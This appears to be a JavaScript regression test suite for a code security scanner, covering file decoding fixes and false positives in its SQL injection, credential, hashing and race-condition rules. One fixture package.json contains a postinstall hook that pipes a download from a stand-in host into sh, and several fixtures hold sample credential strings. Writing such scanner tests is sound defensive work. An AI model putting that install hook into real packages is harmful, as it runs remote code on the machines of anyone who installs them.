// Regression tests for the 2026-10-21 audit. The same two themes as the last
// one, found one layer further out: files read as mojibake or not at all (a
// UTF-16 .env, a BOM'd package.json, every .svelte/.vue/.astro file, a .env
// whose parent directory is gitignored), and rules reporting critical on
// correct code (a QuickBooks query called SQL injection, a redaction
// replacement string called a credential, a device-id digest called weak
// password hashing, a rate limiter called a race). Every test here failed
// before its fix except the marked keep-cases, which pin the true positives
// each fix had to preserve.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';

import { scan } from '../dist/index.js';
import { languagesFor } from '../dist/utils/files.js';
import { decodeText } from '../dist/utils/gitignore.js';
import { resolveVersionsForTest } from '../dist/scanners/dependencies.js';

/** A throwaway project from a { path: contents } map; Buffer values write raw bytes. */
function project(files) {
  const root = mkdtempSync(join(tmpdir(), 'cts-oct21-'));
  for (const [path, contents] of Object.entries(files)) {
    mkdirSync(dirname(join(root, path)), { recursive: true });
    writeFileSync(join(root, path), contents);
  }
  return root;
}

const byId = (result, id) => result.findings.filter((f) => f.id === id);
const run = (root, options = {}) => scan({ root, offline: true, ...options });

const STRIPE_LIVE = ['sk', 'live', '51NqAbCdEfGhIjKlMnOpQrStU'].join('_');

// --- text that decoded to mojibake and counted as scanned --------------------

test('a UTF-16LE .env (PowerShell’s redirect encoding) still gives up its secrets', async () => {
  const text = `STRIPE_SECRET_KEY=${STRIPE_LIVE}\n`;
  const le = Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from(text, 'utf16le')]);
  const root = project({ '.env': le, '.gitignore': '.env\n' });
  const result = await run(root);
  const found = byId(result, 'CTS030');
  assert.equal(found.length, 1);
  assert.equal(found[0].file, '.env');
});

test('a UTF-16BE file decodes too', () => {
  const text = 'KEY=value\n';
  const le = Buffer.from(text, 'utf16le');
  const be = Buffer.from(le);
  be.swap16();
  assert.equal(decodeText(Buffer.concat([Buffer.from([0xfe, 0xff]), be])), text);
  assert.equal(decodeText(Buffer.concat([Buffer.from([0xef, 0xbb, 0xbf]), Buffer.from(text)])), text);
});

test('a BOM’d package.json keeps its dependency and install-hook checks', async () => {
  const manifest =
    '{\n  "name": "bomapp",\n  "dependencies": { "left-pad": "^1.3.0" },\n' +
    '  "scripts": { "postinstall": "curl http://x.example/i | sh" }\n}\n';
  const root = project({
    'package.json': Buffer.concat([Buffer.from([0xef, 0xbb, 0xbf]), Buffer.from(manifest)]),
  });
  const result = await run(root);
  // Before the fix: JSON.parse threw on the BOM, every collector returned
  // nothing, and the run said "no dependencies declared" — passed, complete.
  assert.equal(byId(result, 'CTS028').length, 1);
  const row = result.checks.find((c) => c.label.startsWith('Dependency verification'));
  assert.match(row.label, /1 package/);
});

test('a package.json that cannot be parsed makes the run incomplete, not clean', async () => {
  const root = project({
    'package.json': '{ "name": "broken", "dependencies": { "left-pad": "^1.3.0", } }\n',
  });
  const result = await run(root);
  assert.ok(
    result.incomplete.some((n) => /package\.json could not be parsed/.test(n)),
    `expected an incomplete note about package.json, got: ${JSON.stringify(result.incomplete)}`,
  );
});

// --- files that were never read at all ---------------------------------------

test('a secret in a .svelte, .vue or .astro file is found', async () => {
  const sfc = (body) => body;
  const root = project({
    'package.json': '{"name":"sfc"}',
    'src/Widget.svelte': sfc(`<script>\n  const key = '${STRIPE_LIVE}';\n</script>\n<div/>\n`),
    'src/Widget.vue': sfc(`<template><div/></template>\n<script>\nconst key = '${STRIPE_LIVE}';\n</script>\n`),
    'src/page.astro': sfc(`---\nconst key = '${STRIPE_LIVE}';\n---\n<html/>\n`),
  });
  const result = await run(root);
  const files = byId(result, 'CTS030').map((f) => f.file).sort();
  assert.deepEqual(files, ['src/Widget.svelte', 'src/Widget.vue', 'src/page.astro']);
  // And the community scanner treats them as the HTML-shaped documents they
  // are, rather than skipping them for having no language.
  assert.deepEqual(languagesFor('a/b.svelte'), ['html']);
  assert.deepEqual(languagesFor('a/b.vue'), ['html']);
  assert.deepEqual(languagesFor('a/b.astro'), ['html']);
});

test('a .env directly inside a gitignored directory is still read', async () => {
  const root = project({
    'package.json': '{"name":"envdir"}',
    '.gitignore': 'secrets-dir/\n',
    'secrets-dir/.env': `STRIPE_SECRET_KEY=${STRIPE_LIVE}\n`,
  });
  const result = await run(root);
  const found = byId(result, 'CTS030');
  assert.equal(found.length, 1);
  assert.equal(found[0].file, 'secrets-dir/.env');
});

// --- manifests that were read and asked nothing -------------------------------

test('requirements files under their conventional other names are collected', async () => {
  const root = project({
    'package.json': '{"name":"py"}',
    'requirements-dev.txt': 'leftpad-dev-not-real==1.0\n',
    'requirements/base.txt': 'leftpad-base-not-real==1.0\n',
  });
  const result = await run(root);
  const row = result.checks.find((c) => c.label.startsWith('Dependency verification'));
  assert.match(row.label, /2 packages/);
});

test('poetry group and PEP 735 dependency-group tables are collected', async () => {
  const root = project({
    'pyproject.toml': [
      '[project]',
      'name = "demo"',
      '',
      '[tool.poetry.group.dev.dependencies]',
      'pytest-not-real-xyz = "^8.0"',
      '',
      '[dependency-groups]',
      'dev = [',
      '  "ruff-not-real-xyz>=0.4",',
      ']',
    ].join('\n'),
  });
  const result = await run(root);
  const row = result.checks.find((c) => c.label.startsWith('Dependency verification'));
  assert.match(row.label, /2 packages/);
});

test('a pnpm v9 lockfile’s quoted scoped entries resolve to their locked version', () => {
  const root = project({
    'pnpm-lock.yaml': [
      "lockfileVersion: '9.0'",
      '',
      'packages:',
      '',
      "  '@babel/core@7.24.0':",
      '    resolution: {integrity: sha512-x}',
      '',
      '  express@4.18.2:',
      '    resolution: {integrity: sha512-y}',
    ].join('\n'),
  });
  const versions = resolveVersionsForTest(root, []);
  assert.equal(versions.get('npm:@babel/core'), '7.24.0');
  assert.equal(versions.get('npm:express'), '4.18.2');
});

// --- rules on correct code ----------------------------------------------------

const PKG = '{"name":"g","dependencies":{"@supabase/supabase-js":"2.45.0"}}';

test('VG010: an interpolation that is itself a SQL quoting call is the escaping, not the bug', async () => {
  const root = project({
    'package.json': PKG,
    'lib/columns.js': `export async function columnsOf(db, table) {
  const res = await db.prepare(\`PRAGMA table_info(\${quoteIdent(table)})\`).all()
  return res
}
`,
  });
  const result = await run(root);
  assert.deepEqual(byId(result, 'VG010'), []);
});

test('VG010 keep-case: the same statement with a bare identifier still fires', async () => {
  const root = project({
    'package.json': PKG,
    'lib/columns.js': `export async function columnsOf(db, table) {
  const res = await db.prepare(\`SELECT * FROM \${table} WHERE x = 1\`).all()
  return res
}
`,
  });
  const result = await run(root);
  assert.equal(byId(result, 'VG010').length, 1);
});

test('VG010: a QuickBooks Query Language string is not SQL to any database', async () => {
  const root = project({
    'package.json': PKG,
    'lib/qb.ts': `export async function fetchAll(token: string, realmId: string, entity: string) {
  const query = \`SELECT * FROM \${entity} STARTPOSITION 1 MAXRESULTS 1000\`
  const url = \`https://api.example/v3/company/\${realmId}/query?query=\${encodeURIComponent(query)}\`
  return fetch(url, { headers: { Authorization: \`Bearer \${token}\` } })
}
`,
  });
  const result = await run(root);
  assert.deepEqual(byId(result, 'VG010'), []);
});

test('VG010: example code inside a string literal is data, not a query', async () => {
  const root = project({
    'package.json': PKG,
    'src/rules.ts': `export const rule = {
  description: "the call-form (prisma.$queryRaw(\`...\${var}...\`)) interpolates the variable in JS first",
}
`,
  });
  const result = await run(root);
  assert.deepEqual(byId(result, 'VG010'), []);
});

test('VG123 is superseded by VG010: one finding for one interpolated query', async () => {
  const root = project({
    'package.json': PKG,
    'lib/db.js': 'export const f = (db, req) => db.query(`SELECT * FROM t WHERE id = ${req.body.id}`)\n',
  });
  const result = await run(root);
  assert.equal(byId(result, 'VG010').length, 1);
  assert.deepEqual(byId(result, 'VG123'), []);
});

test('VG001/VG062: a redaction replacement, a sample token and a password hash are not credentials', async () => {
  const root = project({
    'package.json': PKG,
    'lib/sanitize.py': `patterns = [
    (r'password["\\s]*[:=]["\\s]*([^\\s"\\']+)', 'password="[REDACTED]"'),
]
`,
    'docs-gen.js': 'export const example = `export NPM_AUTH_TOKEN="npm_1234567890abcdef1234567890abcdef12345678"`\n',
    'app/api/login/route.js':
      "const DUMMY_PASSWORD_HASH = '$2b$12$ZMncffZoN9dwfTqJWeFLsO0BbB.2MdHuGHdsiiwT7.AzYcyXTNAoy'\nexport async function POST(req) { return Response.json({ ok: true }) }\n",
  });
  const result = await run(root);
  assert.deepEqual(byId(result, 'VG001'), []);
  assert.deepEqual(byId(result, 'VG062'), []);
});

test('VG001 keep-case: an opaque value on a credential name still fires', async () => {
  const root = project({
    'package.json': PKG,
    'lib/config.js': "export const apiKey = 'zX9kQ2mP8vL4nR7tY1wE5uI3oA6sD0fG'\n",
  });
  const result = await run(root);
  assert.equal(byId(result, 'VG001').length, 1);
});

test('VG060: an md5 device id is not password hashing; md5 of a password still is', async () => {
  const root = project({
    'package.json': PKG,
    'agent.py': `import hashlib, socket, uuid

def stable_device_id():
    mac = uuid.getnode()
    seed = f"{socket.gethostname()}-{mac}"
    return hashlib.md5(seed.encode()).hexdigest()
`,
    'auth.py': `import hashlib

def store(password):
    return hashlib.md5(password.encode()).hexdigest()
`,
  });
  const result = await run(root);
  const files = byId(result, 'VG060').map((f) => f.file);
  assert.deepEqual(files, ['auth.py']);
});

test('VG154: a count-based rate limiter that rejects and appends is not a race finding', async () => {
  const root = project({
    'package.json': PKG,
    'functions/report/index.ts': `export async function handle(admin: any, ip: string, body: any) {
  const { count: ipCount } = await admin.from('client_errors')
    .select('*', { count: 'exact', head: true })
    .eq('ip_address', ip)
  if ((ipCount ?? 0) >= 5) {
    return { throttled: true }
  }
  await admin.from('client_errors').insert({ ip_address: ip, message: body.message })
  return { ok: true }
}
`,
  });
  const result = await run(root);
  assert.deepEqual(byId(result, 'VG154'), []);
});

test('VG154: a page that counts one table and saves another is load-then-save, not check-then-act', async () => {
  const root = project({
    'package.json': PKG,
    'src/account.jsx': `export async function loadAndSave(supabase, uid, prefs) {
  const { count } = await supabase.from('forum_posts').select('id', { count: 'exact', head: true }).eq('user_id', uid)
  if (count !== null) {
    await supabase.from('forum_profiles').update({ email_notifications: prefs.email }).eq('user_id', uid)
  }
  return count
}
`,
  });
  const result = await run(root);
  assert.deepEqual(byId(result, 'VG154'), []);
});

// The credits race itself staying reported is pinned in audit-coverage.test.js.

// --- test fixtures reported as production holes --------------------------------

test('RLS findings in a test fixture are reduced and say so; migrations are not', async () => {
  const sql = 'create table public.things (id uuid primary key, body text);\n';
  const fixture = await run(
    project({ 'package.json': PKG, 'test/sql/0013_rls_disabled.sql': sql }),
  );
  const fixtureFinding = byId(fixture, 'CTS010');
  assert.equal(fixtureFinding.length, 1);
  assert.equal(fixtureFinding[0].severity, 'low');
  assert.match(fixtureFinding[0].detail, /tests, fixtures or docs/);

  const migration = await run(
    project({ 'package.json': PKG, 'supabase/migrations/0001_things.sql': sql }),
  );
  const migrationFinding = byId(migration, 'CTS010');
  assert.equal(migrationFinding.length, 1);
  assert.equal(migrationFinding[0].severity, 'critical');
});

test('a secret in Go test files and testdata is reduced like any other fixture', async () => {
  const root = project({
    'package.json': '{"name":"go"}',
    'detect/detect_test.go': `package detect\n\nconst key = "${STRIPE_LIVE}"\n`,
    'testdata/config/sample.txt': `STRIPE_SECRET_KEY=${STRIPE_LIVE}\n`,
  });
  const result = await run(root);
  const cts030 = byId(result, 'CTS030');
  assert.equal(cts030.length, 2);
  for (const f of cts030) assert.equal(f.severity, 'low', `${f.file} should be low`);
  // The community scanner places by its own path classifier (utils/paths.ts),
  // which had the same blind spot — the two definitions drift in step.
  for (const f of byId(result, 'VG003')) {
    assert.equal(f.severity, 'low', `${f.file} VG003 should be low`);
  }
  assert.ok(byId(result, 'VG003').length >= 1, 'expected VG003 to fire somewhere here');
});

test('an sk-ant key is one Anthropic finding, not also an OpenAI one', async () => {
  const key = 'sk-ant-api03-' + 'abc123xyz-456def789hij-klmnopqrstuvwx-3456yza789bcde'.repeat(1);
  const root = project({
    'package.json': '{"name":"ant"}',
    'src/config.ts': `export const k = '${key}'\n`,
  });
  const result = await run(root);
  const cts030 = byId(result, 'CTS030');
  assert.equal(cts030.length, 1);
  assert.match(cts030[0].title, /Anthropic/);
});
